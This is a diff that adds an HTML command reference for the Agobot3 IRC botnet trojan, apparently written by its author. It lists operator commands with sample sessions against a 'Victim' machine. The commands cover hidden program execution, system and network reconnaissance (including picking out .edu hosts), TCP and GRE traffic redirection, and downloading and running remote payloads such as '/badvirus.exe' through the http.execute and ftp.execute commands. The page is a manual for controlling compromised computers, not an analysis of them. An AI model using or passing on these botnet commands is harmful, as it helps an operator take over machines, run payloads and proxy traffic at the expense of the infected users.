@@ -1,0 +1,794 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <title>agobot3 command reference</title>
+  <meta content="Ago" name="author">
+</head>
+<body alink="#ff9933" vlink="#ff9933" link="#ff9933" text="#cccccc"
+ bgcolor="#000000">
+<a name="top"></a>
+<p align="center"><font color="#808080" size="4" face="Arial Black"><img
+ alt="" title="" src="agobot3.jpg"
+ style="border: 0px solid ; width: 240px; height: 60px;"><br>
+</font><font color="#cccccc" size="5" face="Arial Black">command
+reference<br>
+</font><font size="1" color="#cccccc" face="Arial Black">(for Agobot3
+0.1.3 Alpha)<br>
+</font></p>
+<p align="center"><a href="#bot">bot</a> / <a href="#commandmgr">command
+manager</a> / <a href="#cvar">cvar</a>
+/ <a href="#irc">irc</a> / <a href="#mac">mac</a>
+/&nbsp;<a href="#redirect">redirect</a> / <a href="#downloader">downloader</a><br>
+</p>
+<table bordercolor="#333333" bordercolordark="#333333"
+ bordercolorlight="#333333" width="100%" border="1">
+  <tbody>
+    <tr>
+      <td bgcolor="#666666" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="11%"><b><font
+ color="#ffffff" size="2" face="Arial">command</font></b></td>
+      <td bgcolor="#666666" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="6%"><b><font
+ color="#ffffff" size="2" face="Arial">alias</font></b></td>
+      <td bgcolor="#666666" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="19%"><b><font
+ color="#ffffff" size="2" face="Arial">syntax</font></b></td>
+      <td bgcolor="#666666" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="30%"><b><font
+ color="#ffffff" size="2" face="Arial">description</font></b></td>
+      <td bgcolor="#666666" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="34%"><b><font
+ color="#ffffff" size="2" face="Arial">example</font></b></td>
+    </tr>
+    <tr>
+      <td bgcolor="#333333" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="11%"><b><font
+ color="#ffffff" size="2" face="Arial">bot commands</font></b></td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="6%"><a
+ name="bot"></a>&nbsp;</td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="19%">&nbsp;</td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="30%">&nbsp;</td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="34%">
+      <div align="right"><a href="#top">top</a></div>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">bot.about</td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">bot.about<br>
+      </td>
+      <td align="left" width="30%">displays the info the author wants
+you to see</td>
+      <td align="left" width="34%">
+      <p>&lt;Ago&gt; .bot.about<br>
+&lt;Agobot3&gt; Agobot3 (0.1.3 Alpha) "Release" on "Win32" by Ago
+(theago@gmx.net). homepage: http://none.yet/</p>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">bot.die<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">bot.die<br>
+      </td>
+      <td align="left" width="30%">terminates the bot<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .bot.die<br>
+&lt;-- Agobot3 has quit (Read error: 104 (Connection reset by peer))<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">bot.dns<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">bot.dns &lt;hostname/ip&gt;<br>
+      </td>
+      <td align="left" width="30%">resolves ip/hostname by dns<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .bot.dns ago.bastart.net<br>
+&lt;Agobot3&gt; ago.bastart.net -&gt; 90.0.1.55<br>
+&lt;Ago&gt; .bot.dns 90.0.1.55<br>
+&lt;Agobot3&gt; 90.0.1.55 -&gt; ago.bastart.net<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">bot.execute<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">bot.execute &lt;visibility&gt;
+"&lt;command&gt;"<br>
+      </td>
+      <td align="left" width="30%">makes the bot execute an .exe, exe
+is hidden when visibility is 0. note that visibility has no effect on
+gui programs that dont honor the visibility parameter WinMain gets.<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .bot.execute 1
+notepad.exe<br>
+(Victim executes notepad.exe visible)<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">bot.id<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">bot.id<br>
+      </td>
+      <td align="left" width="30%">displays the bots id which is used
+to identify which version is running, and only update the bots that
+need it during an update<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .bot.id<br>
+&lt;Agobot3&gt; DC0M0R17<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">bot.nick<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">bot.nick &lt;nickname&gt;<br>
+      </td>
+      <td align="left" width="30%">changes the nickname of the bot<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .bot.nick dem_bot0r<br>
+--- Agobot3 is now known as dem_bot0r<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">bot.open<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">bot.open &lt;filename&gt;<br>
+      </td>
+      <td align="left" width="30%">makes the bot open any file using
+ShellExecuteA or similar functions (in Linux) to open any file that is
+a registered file type<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .bot.open e:\agobot3.txt<br>
+(Victim opens e:\agobot3.txt in Notepad)<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">bot.remove<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">bot.remove<br>
+      </td>
+      <td align="left" width="30%">completely removes the bot from the
+system<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .bot.remove<br>
+&lt;Agobot3&gt; removing bot...<br>
+&lt;-- Agobot3 has quit (Read error: 104 (Connection reset by peer))<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">bot.removeallbut<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">bot.removeallbut &lt;id&gt;<br>
+      </td>
+      <td align="left" width="30%">same as bot.remove, but skips bots
+that have the specified id<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .bot.removeallbut
+DC0M0R17<br>
+(All bots that don't have id DC0M0R17 remove themselves)<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">bot.rndnick<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">bot.rndnick<br>
+      </td>
+      <td align="left" width="30%">assigns a new random nickname to the
+bot<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .bot.rndnick<br>
+--- Ago-odkaz is now known as Ago-buzjb<br>
+&lt;Ago&gt; .bot.rndnick<br>
+--- Ago-buzjb is now known as Ago-dgrpv<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">bot.status<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">bot.status<br>
+      </td>
+      <td align="left" width="30%">causes the bot to display its status<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .bot.status<br>
+&lt;Agobot3&gt; Agobot3 (0.1.3 Alpha) "Release" on "Win32" ready. Up 0d
+0h 1m.<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">bot.sysinfo<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">bot.sysinfo<br>
+      </td>
+      <td align="left" width="30%">causes the bot to display system
+information<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .bot.sysinfo<br>
+&lt;Agobot3&gt; cpu: 500MHz. ram: 523764KB total, 300636KB free. os:
+Windows 2k [Service Pack 4] (5.0, build 2195). uptime: 1d 9h 49m <br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">bot.quit<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">bot.quit<br>
+      </td>
+      <td align="left" width="30%">causes the bot to quit irc and
+terminate itself<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .bot.quit<br>
+&lt;-- Agobot3 has quit (Read error: 104 (Connection reset by peer))</td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">bot.repeat<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">bot.repeat &lt;num&gt; &lt;cmd&gt;<br>
+      </td>
+      <td align="left" width="30%">the bot will repeat the specified
+command num times<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .bot.repeat 2 .bot.status<br>
+&lt;Agobot3&gt; Agobot3 (0.1.3 Alpha) "Release" on "Win32" ready. Up 0d
+0h 1m.<br>
+&lt;Agobot3&gt; Agobot3 (0.1.3 Alpha) "Release" on "Win32" ready. Up 0d
+0h 1m.<br>
+      </td>
+    </tr>
+    <tr>
+      <td bgcolor="#333333" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="11%"><b><font
+ color="#ffffff" size="2" face="Arial">command manager commands</font></b></td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="6%"><a
+ name="commandmgr"></a>&nbsp;</td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="19%">&nbsp;</td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="30%">&nbsp;</td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="34%">
+      <div align="right"><a href="#top">top</a></div>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">commands.list</td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">commands.list<br>
+      </td>
+      <td align="left" width="30%">dumps a list of commands similar to
+this<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .commands.list<br>
+&lt;Agobot3&gt; -[ command list ]-<br>
+&lt;Agobot3&gt; 1. / "commands.list" / "Lists all available commands"<br>
+&lt;Agobot3&gt; 2. / "cvar.list" / "prints a list of all cvars"<br>
+(and more to follow...)<br>
+      </td>
+    </tr>
+    <tr>
+      <td bgcolor="#333333" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="11%"><b><font
+ color="#ffffff" size="2" face="Arial">cvar commands</font></b></td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="6%"><a
+ name="cvar"></a>&nbsp;</td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="19%">&nbsp;</td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="30%">&nbsp;</td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="34%">
+      <div align="right"><a href="#top">top</a></div>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">cvar.list<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">cvar.list<br>
+      </td>
+      <td align="left" width="30%">dumps a list of cvars<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .cvar.list<br>
+&lt;Agobot3&gt; -[ cvar list ]-<br>
+&lt;Agobot3&gt; 1. / "si_server_root.chanpass" / "" / "Server Info -
+Channel Password"<br>
+&lt;Agobot3&gt; 2. / "si_server_root.mainchan" / "#agobot3" / "Server
+Info - Main Channel"<br>
+(and more to follow...)<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">cvar.get<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">cvar.get &lt;cvarname&gt;<br>
+      </td>
+      <td align="left" width="30%">displays the value of the named cvar<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .cvar.get si_mainchan<br>
+&lt;Agobot3&gt; si_mainchan == "#agobot3"<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">cvar.set<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">cvar.get &lt;cvarname&gt;
+"&lt;value&gt;"<br>
+      </td>
+      <td align="left" width="30%">sets the value of the named cvar to
+the value<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .cvar.set bot_prefix "\"<br>
+&lt;Agobot3&gt; bot_prefix = "\" (was ".")<br>
+&lt;Ago&gt; \bot.status<br>
+&lt;Agobot3&gt; Agobot3 (0.1.3 Alpha) "Release" on "Win32" ready. Up 0d
+0h 0m.<br>
+      </td>
+    </tr>
+    <tr>
+      <td bgcolor="#333333" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="11%"><b><font
+ color="#ffffff" size="2" face="Arial">irc commands</font></b></td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="6%"><a
+ name="irc"></a>&nbsp;</td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="19%">&nbsp;</td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="30%">&nbsp;</td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="34%">
+      <div align="right"><a href="#top">top</a></div>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">irc.disconnect / irc.reconnect<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">irc.disconnect / irc.reconnect<br>
+      </td>
+      <td align="left" width="30%">disconnects/reconnects the bot from
+irc<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .irc.disconnect<br>
+&lt;-- Agobot3 has quit (Read error: 104 (Connection reset by peer))</td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">irc.action<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">irc.action &lt;target&gt;
+"&lt;action&gt;"<br>
+      </td>
+      <td align="left" width="30%">makes the bot send an action to the
+target<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .irc.action #agobot3
+"ddoses da bad guy"<br>
+* Agobot3 ddoses da bad guy</td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">irc.getedu<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">irc.getedu<br>
+      </td>
+      <td align="left" width="30%">makes bot reply with irc.netinfo if
+the hostname contains .edu<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .irc.getedu<br>
+&lt;Agobot3&gt; connection type: N/A (N/A). local IP address:
+18.240.0.110. connected from: XXXXXXXX.mit.edu<br>
+(more to follow...)<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">irc.gethost<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">irc.gethost &lt;hostpart&gt;<br>
+      </td>
+      <td align="left" width="30%">makes bot reply with irc.netinfo if
+the hostname contains the specified hostpart </td>
+      <td align="left" width="34%">&lt;Ago&gt; .irc.gethost tu-<br>
+&lt;Agobot3&gt; connection type: N/A (N/A). local IP address:
+130.83.217.200. connected from: cXXXX.karlshof.wh.tu-darmstadt.de<br>
+(more to follow...)<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">irc.join/irc.part<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">irc.join &lt;channel&gt;
+&lt;pwd&gt; / irc.part &lt;channel&gt;<br>
+      </td>
+      <td align="left" width="30%">makes the bot join part the
+specified channel<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .irc.join #agobot4
+AJuq4Js<br>
+(Victim joins #agobot4)<br>
+&lt;Ago&gt; .irc.part #agobot4<br>
+(Victim leaves #agobot4)<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">irc.netinfo<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">irc.netinfo<br>
+      </td>
+      <td align="left" width="30%">causes the bot to display network
+information </td>
+      <td align="left" width="34%">&lt;Ago&gt; .irc.netinfo<br>
+&lt;Agobot3&gt; connection type: N/A (N/A). local IP address:
+90.0.1.55. connected from: ago.bastart.net<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">irc.privmsg<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">irc.privmsg &lt;target&gt;
+"&lt;text&gt;"<br>
+      </td>
+      <td align="left" width="30%">makes the bot send a privmsg to the
+target<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .irc.privmsg #agobot3
+"bla"<br>
+&lt;Agobot3&gt; bla<br>
+&lt;Ago&gt; .irc.privmsg Ago "bla"<br>
+*Agobot3* bla<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">irc.quit<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">irc.quit<br>
+      </td>
+      <td align="left" width="30%">makes the bot quit from irc<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .irc.quit<br>
+&lt;-- Agobot3 has quit (Read error: 104 (Connection reset by peer))</td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">irc.raw<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">irc.raw "&lt;string&gt;"<br>
+      </td>
+      <td align="left" width="30%">makes the bot send raw string to the
+server<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .irc.raw "QUIT :Bla"<br>
+&lt;-- Agobot3 has quit (Quit: Bla)</td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">irc.reconnect<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">irc.reconnect<br>
+      </td>
+      <td align="left" width="30%">makes the bot reconnect to irc<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .irc.reconnect<br>
+&lt;-- Agobot3 has quit (Remote closed the connection)<br>
+--&gt; Agobot3 (Agobot3@bastart-1091.bastart.net) has joined #agobot3<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">irc.server<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">irc.server &lt;server&gt;
+&lt;port&gt; &lt;serverpass&gt;<br>
+      </td>
+      <td align="left" width="30%">makes the change the server cvars<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .irc.server
+some.ircd.org 6667<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">irc.mode<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">irc.mode &lt;modestr&gt;<br>
+      </td>
+      <td align="left" width="30%">makes the the bot change irc modes<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .irc.mode #agobot3 -o Ago<br>
+--- Agobot3 removes channel operator status from Ago<br>
+      </td>
+    </tr>
+    <tr>
+      <td bgcolor="#333333" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="11%"><b><font
+ color="#ffffff" size="2" face="Arial">mac commands</font></b></td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="6%"><a
+ name="mac"></a>&nbsp;</td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="19%">&nbsp;</td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="30%">&nbsp;</td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="34%">
+      <div align="right"><a href="#top">top</a></div>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">login<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">login &lt;user&gt; &lt;password&gt;<br>
+      </td>
+      <td align="left" width="30%">logs in a user to the bot<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .login Ago *******<br>
+&lt;Agobot3&gt; Password accepted.<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">mac.logout<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">mac.logout<br>
+      </td>
+      <td align="left" width="30%">logs out a user from the bot<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .mac.logout<br>
+&lt;Agobot3&gt; User Ago logged out.<br>
+      </td>
+    </tr>
+    <tr>
+      <td bgcolor="#333333" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="11%"><b><font
+ color="#ffffff" size="2" face="Arial">redirect commands</font></b></td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="6%"><a
+ name="redirect"></a>&nbsp;</td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="19%">&nbsp;</td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="30%">&nbsp;</td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="34%">
+      <div align="right"><a href="file:///V:/doc/commandref.html#top">top</a></div>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">redirect.tcp<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">redirect.tcp &lt;localport&gt;
+&lt;remotehost&gt; &lt;remoteport&gt; </td>
+      <td align="left" width="30%">redirects a tcp port to another host<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .redirect.tcp 2352
+www.microsoft.com 80<br>
+&lt;Agobot3&gt; redirtcp: redirecting from port 2352 to
+"www.microsoft.com:80".<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">redirect.gre<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">redirect.gre &lt;server&gt;
+&lt;client&gt; [localip]<br>
+      </td>
+      <td align="left" width="30%">redirects gre traffic, this can be
+used to proxy PPTP VPN connections.<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .redirect.gre
+www.microsoft.com ago.bastart.net<br>
+&lt;Agobot3&gt; redirgre: redirecting from "www.microsoft.com" to
+"ago.bastart.net" over "". </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">redirect.stop<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">redirect.stop<br>
+      </td>
+      <td align="left" width="30%">stops all redirects immediately<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .redirect.stop<br>
+      </td>
+    </tr>
+    <tr>
+      <td bgcolor="#333333" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="11%"><b><font
+ color="#ffffff" size="2" face="Arial">downloader commands</font></b></td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="6%"><a
+ name="downloader"></a>&nbsp;</td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="19%">&nbsp;</td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="30%">&nbsp;</td>
+      <td bgcolor="#000000" align="center" bordercolordark="#000000"
+ bordercolorlight="#000000" bordercolor="#000000" width="34%">
+      <div align="right"><a href="#top">top</a></div>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">ftp.download<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">ftp.download &lt;user&gt;
+&lt;pass&gt; &lt;host&gt;
+&lt;path&gt; &lt;target&gt;<br>
+      </td>
+      <td align="left" width="30%">makes the bot download a file from
+ftp to the specified directory. supports environment variable
+expansions.<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .ftp.download
+billg password ftp.microsoft.com / %TEMP%\microsoft.html<br>
+&lt;Agobot3&gt; Receiving file.<br>
+&lt;Agobot3&gt; download to C:\Temp\microsoft.html finished.<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">ftp.execute<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">ftp.execute &lt;user&gt;
+&lt;pass&gt; &lt;host&gt;
+&lt;path&gt; &lt;target&gt;<br>
+      </td>
+      <td align="left" width="30%">makes the bot download a file from
+ftp to the specified directory and execute it. supports environment
+variable expansions.</td>
+      <td align="left" width="34%">&lt;Ago&gt; .ftp.execute
+billg password www.microsoft.com /badvirus.exe %TEMP%\microsoft.exe<br>
+&lt;Agobot3&gt; Receiving file.<br>
+&lt;Agobot3&gt; download to C:\Temp\microsoft.exe finished.<br>
+&lt;Agobot3&gt; opened C:\Temp\microsoft.exe.<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">ftp.update<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">ftp.update &lt;user&gt;
+&lt;pass&gt; &lt;host&gt;
+&lt;path&gt; &lt;target&gt; &lt;id&gt;<br>
+      </td>
+      <td align="left" width="30%">makes the bot download a file from
+ftp to the specified directory and update to it if the id doesn't
+match. supports environment
+variable expansions.</td>
+      <td align="left" width="34%">&lt;Ago&gt; .ftp.update
+billg password www.microsoft.com /badvirus.exe %TEMP%\microsoft.exe
+Microsoft0r24<br>
+&lt;Agobot3&gt; Receiving update<br>
+&lt;Agobot3&gt; download to C:\Temp\microsoft.exe finished,
+updating....</td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">http.download<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">http.download &lt;host&gt;
+&lt;path&gt; &lt;target&gt;<br>
+      </td>
+      <td align="left" width="30%">makes the bot download a file from
+http to the specified directory. supports environment variable
+expansions.<br>
+      </td>
+      <td align="left" width="34%">&lt;Ago&gt; .http.download
+www.microsoft.com / %TEMP%\microsoft.html<br>
+&lt;Agobot3&gt; Receiving file.<br>
+&lt;Agobot3&gt; download to C:\Temp\microsoft.html finished.<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">http.execute<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">http.execute &lt;host&gt;
+&lt;path&gt; &lt;target&gt;<br>
+      </td>
+      <td align="left" width="30%">makes the bot download a file from
+http to the specified directory and execute it. supports environment
+variable expansions.</td>
+      <td align="left" width="34%">&lt;Ago&gt; .http.execute
+www.microsoft.com /badvirus.exe %TEMP%\microsoft.exe<br>
+&lt;Agobot3&gt; Receiving file.<br>
+&lt;Agobot3&gt; download to C:\Temp\microsoft.exe finished.<br>
+&lt;Agobot3&gt; opened C:\Temp\microsoft.exe.<br>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" width="11%">http.update<br>
+      </td>
+      <td align="center" width="6%"><br>
+      </td>
+      <td align="center" width="19%">http.update &lt;host&gt;
+&lt;path&gt; &lt;target&gt; &lt;id&gt;<br>
+      </td>
+      <td align="left" width="30%">makes the bot download a file from
+http to the specified directory and update to it if the id doesn't
+match. supports environment
+variable expansions.</td>
+      <td align="left" width="34%">&lt;Ago&gt; .http.update
+www.microsoft.com /badvirus.exe %TEMP%\microsoft.exe Microsoft0r24<br>
+&lt;Agobot3&gt; Receiving file<br>
+&lt;Agobot3&gt; download to C:\Temp\microsoft.exe finished,
+updating....</td>
+    </tr>
+    <tr>
+    </tr>
+    <tr>
+      <td colspan="5" bordercolordark="#333333"
+ bordercolorlight="#333333" bordercolor="#333333"><font color="#cccccc"><font
+ size="2" face="Arial">notes:<br>
+1. none yet</font></font></td>
+    </tr>
+  </tbody>
+</table>
+</body>
+</html>
